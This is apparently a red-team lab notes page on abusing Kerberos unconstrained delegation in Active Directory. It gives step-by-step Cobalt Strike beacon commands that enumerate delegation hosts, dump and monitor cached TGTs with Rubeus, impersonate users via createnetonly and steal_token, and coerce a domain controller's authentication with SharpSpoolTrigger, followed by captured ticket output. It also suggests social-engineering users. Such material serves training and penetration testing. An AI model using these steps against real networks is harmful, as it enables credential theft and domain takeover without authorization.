# Unconstrained Delegation

## Introduction

Delegation allows a user or computer to impersonate another account in order to access resources (such as backend database servers). Practical examples can be found [here](https://learn.microsoft.com/en-us/archive/blogs/autz\_auth\_stuff/kerberos-delegation).

Unconstrained delegation will cache the user's TGT if it interacts with the system. So if we compromise a machine with unconstrained delegation, we can extract any TGT from it's memory and use them to impersonate users.

<mark style="color:yellow;">**Technique**</mark>: If we compromise a computer with unconstrained delegation, we can social engineer a user to interact with it and steal their TGT. We can also just wait for users and harvest TGT's! Interaction can be as simple as `dir \web\c$`

<mark style="color:red;">**Note**</mark>:   Domain Controllers are always permitted for unconstrained delegation.

## Enumerate computers with unconstrained delegation

```shell
beacon> execute-assembly C:\Tools\ADSearch.exe --search 
"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" 
--attributes samaccountname,dnshostname
```

## Rubeus triage & monitor

Rubeus triage & monitor will show all tickets that are currently cached. It will show the users LUID. The faster way is just to use monitor.

```sh
beacon> execute-assembly C:\Tools\Rubeus.exe triage
```

```
beacon> execute-assembly C:\Tools\Rubeus.exe monitor /interval:10 /nowrap
```

## Rubeus Dump TGT

From the triage & createnetonly we can dump the TGT

```sh
beacon> execute-assembly C:\Tools\Rubeus.exe dump /luid:<luid-from-triage> /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe 
/domain:DEV /username:cfoxy /password:Password123! /ticket:blah

[*] Showing process : False
[*] Username        : cfoxy
[*] Domain          : DEV
[*] Password        : Password123!
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1540
[+] Ticket successfully imported!
[+] LUID            : 0x3206fb
```

## Steal Token

We can steal use token with Cobalt Strike's steal\_token.

```
beacon> steal_token 1540

beacon> ls \\dc-2.rotta.lab\c$
```

## Harvest TGT by forcing authentication

We can obtain TGT's for computer accounts by forcing them to authenticate remotely to the unconstrained machine.

## Rubeus monitor

Rubeus' `monitor` command will drop into loop and continuously monitor for and extract new TGT as they get cached.  It's a superior strategy when compared to running triage manually because there's little chance of us not seeing or missing a ticket.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

[*] Action: TGT Monitoring
[*] Monitoring every 10 seconds for new TGTs
```

## SharpSpoolTrigger

Next, run SharpSpoolTrigger.

```
beacon> execute-assembly C:\Tools\SharpSpoolTrigger.exe dc-2.rotta.lab web.rotta.lab
```

Where:

* DC-2 is the "target".
* WEB is the "listener".

Rubeus will then capture the ticket.

```
[*] 9/6/2022 2:44:52 PM UTC - Found new TGT:

  User                  :  dc-2$.rotta.lab
  StartTime             :  9/6/2022 9:06:14 AM
  EndTime               :  9/6/2022 7:06:14 PM
  RenewTill             :  9/13/2022 9:06:14 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIFuj[...]lDLklP
```

To stop Rubeus, use the `jobs` and `jobkill` commands.\
